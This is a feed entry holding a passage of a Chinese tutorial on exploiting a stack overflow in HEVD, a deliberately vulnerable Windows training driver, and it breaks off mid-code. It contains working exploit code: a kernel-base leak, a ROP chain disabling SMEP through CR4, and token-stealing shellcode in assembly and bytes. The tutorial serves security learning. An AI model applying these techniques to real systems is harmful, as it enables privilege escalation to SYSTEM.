<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Joe1sn&#39;s Cabinet</title>
  
  
  <link href="https://joe1sn.eu.org/atom.xml" rel="self"/>
  
  <link href="https://joe1sn.eu.org/"/>
  <updated>2024-01-25T07:42:10.015Z</updated>
  <id>https://joe1sn.eu.org/</id>
  
  <author>
    <name>Joe1sn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从零探索现代windows内核栈溢出-以HEVD练习为例</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/</id>
    <published>2024-01-25T07:07:41.000Z</published>
    <updated>2024-01-25T07:42:10.015Z</updated>
    
    <content type="html"><![CDATA[<hr /><p>上：<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</a></p><p>中：<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</a></p><p>文章已在先知社区投稿：<a href="https://xz.aliyun.com/t/13365">https://xz.aliyun.com/t/13365</a></p><span id="more"></span><p>中篇的内容一路走来实属不易，本附录对第二章的以下几个遗留问题做出说明</p><ul><li>user编程寻找ROPGadget</li><li>shellcode编写</li><li>Token提权</li><li>KVAS</li></ul><h1 id="user编程寻找ropgadget"><a class="markdownIt-Anchor" href="#user编程寻找ropgadget"></a> user编程寻找ROPGadget</h1><p>ROP全称加返回导向性编程，比如这一章用到的Gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rcx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">mov cr4, rcx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>关于<code>ret</code>汇编本质上就是从栈帧中取出值，然后将<code>ip</code>寄存器设置为该值，等价于<code>pop ip</code>，这样就能完成函数调用的返回等等。</p><p>本章中当我们发生栈溢出时，就会把<code>ret</code>的位置设置为第一段gadget的位置</p><ul><li><code>pop rcx</code>就会将此时栈顶的值<code>0x00000000002506f8</code>存入<code>rcx</code>寄存器，然后<code>ret</code>又从栈顶取出地址<code>mov_rc4_rcx_ret</code>，然后<code>rip</code>寄存器就跳转执行了</li><li><code>mov rc4, rcx</code>将<code>rcx</code>值存入<code>rc4</code>中然后<code>ret</code>又将栈顶的值<code>shellcode_addr</code>设置为<code>rip</code>寄存器的值后返回</li></ul><p>细心一点就会发现本章截图中的地址不一样，因为内核加载时的内存虚拟地址也是随机化的，不过寻址方式依旧是<code>基地址</code>+<code>偏移</code></p><p>这就引申出函数第一段代码：找到内核的基地址</p><h2 id="a找到内核基地址"><a class="markdownIt-Anchor" href="#a找到内核基地址"></a> A.找到内核基地址</h2><p>通过<code>NtQuerySystemInformation </code>这个“半隐藏”函数实现的</p><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQuerySystemInformation(</span><br><span class="line">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  [in, out]       PVOID                    SystemInformation,</span><br><span class="line">  [in]            ULONG                    SystemInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in, out] SystemInformation</span><br></pre></td></tr></table></figure><p>指向接收请求信息的缓冲区的指针。 此信息的大小和结构因 <em>SystemInformationClass</em> 参数的值而异：</p></blockquote><p>很可惜，关于<code>SystemInformationClass</code>微软并没有公开它的设计，网上有很多关于此的资料</p><p><code>SYSTEM_INFORMATION_CLASS</code>：<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm</a></p><p>他是一个枚举，其中<code>0xB</code>就代表着要查询的是<code>SystemModuleInformation</code></p><p><code>SYSTEM_MODULE</code>：<a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html">http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_MODULE</span> &#123;</span><br><span class="line">  ULONG                Reserved1;</span><br><span class="line">  ULONG                Reserved2;</span><br><span class="line">  PVOID                ImageBaseAddress;</span><br><span class="line">  ULONG                ImageSize;</span><br><span class="line">  ULONG                Flags;</span><br><span class="line">  WORD                 Id;</span><br><span class="line">  WORD                 Rank;</span><br><span class="line">  WORD                 w018;</span><br><span class="line">  WORD                 NameOffset;</span><br><span class="line">  BYTE                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125; SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br></pre></td></tr></table></figure><p><code>SystemInformation</code>就是由<code>SYSTEM_MODULE</code>数组作为成员的结构体，这个没有官方文档，也是通过逆向得到的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">ULONG                ModulesCount;</span><br><span class="line">SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure><p>关于查询函数的定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span></span>;</span><br></pre></td></tr></table></figure><ol><li>首先从<code>ntdll</code>导入函数</li><li>然后初始化变量</li><li>查询后打印并返回，如果没有查到就返回0</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span> </span>&#123;</span><br><span class="line">PVOID kernelImageBase = <span class="literal">NULL</span>;</span><br><span class="line">PCHAR kernelImage = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//import function `NtQuerySystemInformation`</span></span><br><span class="line">HMODULE ntdll = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;ntdll&quot;</span>));</span><br><span class="line">PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(ntdll, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (NtQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress() failed.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//init length</span></span><br><span class="line">ULONG len = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;len);</span><br><span class="line"><span class="comment">//init module infomations</span></span><br><span class="line">PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)<span class="built_in">GlobalAlloc</span>(GMEM_ZEROINIT, len);</span><br><span class="line"><span class="keyword">if</span> (pModuleInfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase]  Could not allocate memory for module info.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//starting quering</span></span><br><span class="line">NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, pModuleInfo, len, &amp;len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\n&quot;</span>, status);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; pModuleInfo-&gt;ModulesCount; i++) &#123;</span><br><span class="line">kernelImage = (PCHAR)pModuleInfo-&gt;Modules[i].Name;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(kernelImage, ModuleName)) &#123;</span><br><span class="line">kernelImageBase = pModuleInfo-&gt;Modules[i].ImageBaseAddress;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] [ulGetKernelBase]  Mod name %s &quot;</span>, kernelImage);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%llx\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%X\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)kernelImageBase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="b-找到对应汇编"><a class="markdownIt-Anchor" href="#b-找到对应汇编"></a> B. 找到对应汇编</h2><p>可以使用CTF常用工具<code>ROPGadget</code>，他支持<code>PE</code>格式（因为用的Capstone反汇编引擎）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./HEVD.sys --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure><p>试试<code>ntoskrl.exe</code>的</p><p><img src="https://img.joe1sn.top/uploads/big/5932a20543fd1420ae321f901e1f4c44.png" alt="image-20240119172454699" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000014039eb47 : mov cr4, rcx ; ret</span><br></pre></td></tr></table></figure><p>得到基地址是<code>0x39eb47</code>，另外一个gadget同理</p><p>重写修改下EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rcx = base+ <span class="number">0x20C64C</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mov_cr4_rcx = base+ <span class="number">0x39eb47</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx;</span><br><span class="line"><span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_cr4_rcx;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/14da4b6cf8f39c3a16855b7a20fbf476.png" alt="image-20240119174839482" /></p><p><img src="https://img.joe1sn.top/uploads/big/6c94aaf54fc86ee593668486a2df81a4.png" alt="image-20240119174924327" /></p><p>一些常见的gadget字节序列</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;RET&quot;</span> , &#123; <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RCX&quot;</span>, &#123; <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_CR4_RCX&quot;</span>, &#123; <span class="number">0x0f</span>, <span class="number">0x22</span>, <span class="number">0xe1</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;NOP&quot;</span>, &#123; <span class="number">0x4d</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX_POP_RCX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RCX_PTRRAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x08</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RAX_PTRRCX&quot;</span>, &#123; <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_RAX_RAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_ESI_ESI&quot;</span>, &#123; <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br></pre></td></tr></table></figure><p>如果想直接从二进制读取（这样更快）可以使用：<a href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a> 提供的思路去找</p><h1 id="shellcode编写"><a class="markdownIt-Anchor" href="#shellcode编写"></a> shellcode编写</h1><h2 id="a-手动进行token提权"><a class="markdownIt-Anchor" href="#a-手动进行token提权"></a> A. 手动进行Token提权</h2><p>第二章中使用的是他人提供的shellcode，这里尝试自己写汇编</p><p>注意，这里我们已经进入内核了，所以做的事情和user级别不一样</p><p>同<code>KRPOCESS</code>不同的是<code>EPROCESS</code>描述了程序运行的相关环境，例如：对应的<code>KPROCESS</code>指针、程序的权限等</p><p>在windbg中使用 ，可以列举所有的进程的相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!process 0 0 &lt;process_name&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d79ca59d6f4e93813d144c57ed739409.png" alt="image-20240119180801648" /></p><p>使用下面的命令来查看对应的EPROCESS结构体，这里查看<code>System</code>进程的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt nt!_EPROCESS &lt;Process address&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ab3f24cc80b2f59949d0f14718347944.png" alt="image-20240119181007630" /></p><p><img src="https://img.joe1sn.top/uploads/big/e55eccd39e6efc555de0f0b2aae95b32.png" alt="image-20240119181255215" /></p><p>Token是一个<code>_EX_FAST_REF</code>类型的Union值</p><p><img src="https://img.joe1sn.top/uploads/big/197b66077a9385505b318f09962398af.png" alt="image-20240119181935137" /></p><p><code>RefCnt</code>记录了Token引用的数目，是数据的低4位(64位中，32位是3位)</p><p>将当前进程的除<code>RefCnt</code>以外的其他bit位设置为和System的一致就行了，</p><p>这里 <code>Value</code>与掩码<code>-0xd</code>（RefCount）进行<code>&amp;</code>运算就能得到真实的Token值</p><p><img src="https://img.joe1sn.top/uploads/big/3783b0486f34520cceef6f7e7d4bc37b.png" alt="image-20240119183143972" /></p><p>现在将计算出的Token值复制给cmd.exe（<strong>这是一个新的Token</strong>）</p><p><img src="https://img.joe1sn.top/uploads/big/bd96556683f06ae537f449787700abd7.png" alt="image-20240119183328877" /></p><p><img src="https://img.joe1sn.top/uploads/big/84780c5e389c5cc5645419cd3ec999ec.png" alt="image-20240119183538886" /></p><p><img src="https://img.joe1sn.top/uploads/big/9345344e4adc9083467b09c76f86fa74.png" alt="image-20240119183521964" /></p><p><img src="https://img.joe1sn.top/uploads/big/9ad936fd2b23d649493103c25b0cad43.png" alt="image-20240119183609699" /></p><h2 id="b-进行shellcode编写"><a class="markdownIt-Anchor" href="#b-进行shellcode编写"></a> B. 进行Shellcode编写</h2><p>在刚才的<code>EPROCESS</code>中，有一段记录的是程序的链表：<code>ActiveProcessLinks</code>，而且windows会生成一段独特的标识来标记每一个程序：<code>UniqueProcessId</code>，在这段 <strong>双向</strong> 链表上每段程序都可以被找到，因为可以向前和向后查找，<strong>一般System位于链表开头，所以沿着Flink查找</strong></p><p><img src="https://img.joe1sn.top/uploads/big/f5708429025f321352aa000e50780c46.png" alt="image-20240119193844612" /></p><p><img src="https://img.joe1sn.top/uploads/big/0595f0087054b0dca2dee10c43392202.png" alt="image-20240119193859162" /></p><p><img src="https://img.joe1sn.top/uploads/big/6065735bb4a5fd9a9d01cdf05b408bc7.png" alt="image-20240119194420366" /></p><ol><li><p>通过<code>EPROCESS</code>获得自身<code>ActiveProcessLinks</code>，同时向前/向后查找</p><p><a href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">这篇文章</a>中通过模仿<code>PsGetCurrentProcess</code>，<code>gs:[188h]</code>指向的是一个<code>_KTHREAD </code>，函数的汇编会将这个地址<code>add addr,0xb8</code>，就得到了当前进程的<code>_EPROCESS</code>，这也是许多shellcode的技巧</p><p><img src="https://img.joe1sn.top/uploads/big/7d19f373ab80dd77cee7f9bafa5963c9.png" alt="image-20240120111712416" /></p><p><img src="https://img.joe1sn.top/uploads/big/74dee9c22c569abe177a9d8a2227fa80.png" alt="image-20240120112417119" /></p><p><code>ffff9984d3d97080 </code>就为一个 当前进程的<code>KiInitialThread </code></p><p><code>+0xB8</code>指向的是当前进程的<code>EPROCESS</code>了</p><p><img src="https://img.joe1sn.top/uploads/big/264e3eb8c9addd711fc3d6642ba7917a.png" alt="image-20240120112153274" /></p><p><img src="https://img.joe1sn.top/uploads/big/253b49550220b0df56641a0ce6cd73b2.png" alt="image-20240120112206849" /></p></li><li><p>比较当前<code>ActiveProcessLinks</code>值<code>-8</code>的内存地址是否为<code>UniqueProcessId</code></p></li><li><p>否：更换当前结构体为下一个</p></li><li><p>是：从<code>ActiveProcessLinks-0x70</code>的位置得到<code>Token</code>地址</p></li><li><p>解析Token，赋值给<strong>当前进程</strong>（Windows会自动解析为exp的程序（从页表映射等来看确实应该如此））</p></li></ol><p>仔细逆向会发现</p><p><img src="https://img.joe1sn.top/uploads/big/e3e923aeebb6ddde277f7232637d651d.png" alt="image-20240120105543669" /></p><p>那么在没有任何栈变动的情况下<code>add rsp, 0x28</code>就能恢复栈，但是我们只有了ROP，ROP链中存在两个<code>ret</code>和一个<code>pop</code>，抬栈了0x18，所以在shellcode中只需要<code>add rsp, 0x10</code></p><p><img src="https://img.joe1sn.top/uploads/big/dbc0a6a596ddb6db46f6a3a920c17dbf.png" alt="image-20240120105533497" /></p><p>同时HEVD的<code>NT_STATUS</code>使用<code>RAX</code>检测处理是否成功，所以要<code>xor rax,rax</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax+0x188]</span><br><span class="line">    mov rax, [rax+0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax             ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax+0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]          ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax-0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax             ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]          ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure><p>使用nasm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &quot;C:\Users\xxxx\AppData\Local\bin\NASM\nasm.exe&quot; -f win64 .\TokenSteal.asm -o .\TokenSteal.bin</span><br></pre></td></tr></table></figure><p>编译出的文件位COFF格式，要提取出来，这里我用的是<code>CFF Explore</code>的快速反汇编定位到代码然后用<code>HxD</code>提取的</p><p><img src="https://img.joe1sn.top/uploads/big/fd7286caaeb3160933b88c897f0315a3.png" alt="image-20240120110131666" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">84</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x10</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c0d0423c8f27b5c1bf5d53ab7948a4b9.png" alt="image-20240120105950658" /></p><p><img src="https://img.joe1sn.top/uploads/big/22bab2bb970e84dfa0c194ec6f01567a.png" alt="image-20240120110002444" /></p><h2 id="c-分析上一篇的shellcode"><a class="markdownIt-Anchor" href="#c-分析上一篇的shellcode"></a> C. 分析上一篇的shellcode</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = 